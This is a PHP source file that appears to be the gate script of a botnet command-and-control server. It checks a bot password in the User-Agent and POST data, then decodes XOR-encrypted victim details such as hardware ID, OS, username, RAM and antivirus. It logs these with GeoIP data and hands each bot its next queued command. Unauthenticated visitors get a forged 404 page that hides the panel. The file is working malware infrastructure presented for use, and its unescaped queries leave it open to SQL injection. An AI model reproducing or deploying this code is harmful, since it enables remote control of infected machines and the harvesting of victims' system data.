<?php
    include_once('includes/config.php');
	include_once('includes/xor.php');
	include_once('includes/hexdecode.php');
	
    if ($_SERVER['HTTP_USER_AGENT'] == htmlentities($botpassword)) {
	    if ($botpassword == htmlentities($_POST["key"])) {
	        include("includes/GeoIP.inc");
	
	        $ip          = $_SERVER['REMOTE_ADDR'];
  	        $gi          = geoip_open("includes/GeoIP.dat", GEOIP_STANDARD);
  	        $countrycode = geoip_country_code_by_addr($gi, $ip);
            $country     = geoip_country_name_by_addr($gi, $ip);
		    if ($countrycode == NULL) {
		        $countrycode = "XX";
		    }
		    if ($country == NULL) {
		        $country = "Unknown";
		    }
            geoip_close($gi);
	
            $time        = time();
			$string      = $_POST["string"];
			$string      = hextostr($string);
			$string      = sXOR($string, $botpassword);
			$string      = htmlentities($string);
			
			$array = explode("::", $string);
			
			$hwid        = $array[0];
	        $so          = $array[1];
	        $userpc      = $array[2];
			$ram         = $array[3];
	        $av          = $array[4];
			$status      = "Online";
            
            if (mysql_num_rows(mysql_query("SELECT * FROM bots WHERE hwid='$hwid'")) < 1) {
                mysql_query("INSERT INTO bots (time, ip, hwid, country, countrycode, so, userpc, ram, av, status) VALUES ('$time', '$ip', '$hwid', '$country', '$countrycode', '$so', '$userpc', '$ram', '$av', '$status')");
            } else {
                mysql_query("UPDATE bots SET time='$time' WHERE hwid='$hwid'");
				mysql_query("UPDATE bots SET status='Online' WHERE hwid='$hwid'");
            }
        
            $result = mysql_query("SELECT * FROM cmd WHERE id NOT IN (SELECT id FROM history WHERE hwid='$hwid')");
            $row    = mysql_fetch_array($result);
            
            if (!mysql_num_rows(mysql_query("SELECT * FROM history WHERE hwid='$hwid' && id = '$row[id]'"))) {
                echo bin2hex($row[cmd]);
                
                mysql_query("INSERT INTO history (id, hwid) VALUES ($row[id], '$hwid') ");
                mysql_query("UPDATE cmd SET done = done + 1 WHERE id = $row[id]");
            }
        
            mysql_query("DELETE FROM cmd WHERE done >= amount");
        
		} else {
            header('HTTP/1.0 404 Not Found');
		    echo '<!DOCTYPE HTML PUBLIC "-IETFDTD HTML 2.0EN">'.PHP_EOL;
		    echo '<html><head>'.PHP_EOL;
		    echo '<title>404 Not Found</title>'.PHP_EOL;
		    echo '</head><body>'.PHP_EOL;
		    echo '<h1>Not Found</h1>'.PHP_EOL;
		    echo '<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>'.PHP_EOL;
		    echo '<p>Additionally, a 404 Not Found'.PHP_EOL;
		    echo 'error was encountered while trying to use an ErrorDocument to handle the request.</p>'.PHP_EOL;
		    echo '</body></html>'.PHP_EOL;
            exit();
		}
	} else {
        header('HTTP/1.0 404 Not Found');
		echo '<!DOCTYPE HTML PUBLIC "-IETFDTD HTML 2.0EN">'.PHP_EOL;
		echo '<html><head>'.PHP_EOL;
		echo '<title>404 Not Found</title>'.PHP_EOL;
		echo '</head><body>'.PHP_EOL;
		echo '<h1>Not Found</h1>'.PHP_EOL;
		echo '<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>'.PHP_EOL;
		echo '<p>Additionally, a 404 Not Found'.PHP_EOL;
		echo 'error was encountered while trying to use an ErrorDocument to handle the request.</p>'.PHP_EOL;
		echo '</body></html>'.PHP_EOL;
        exit();
    }
?>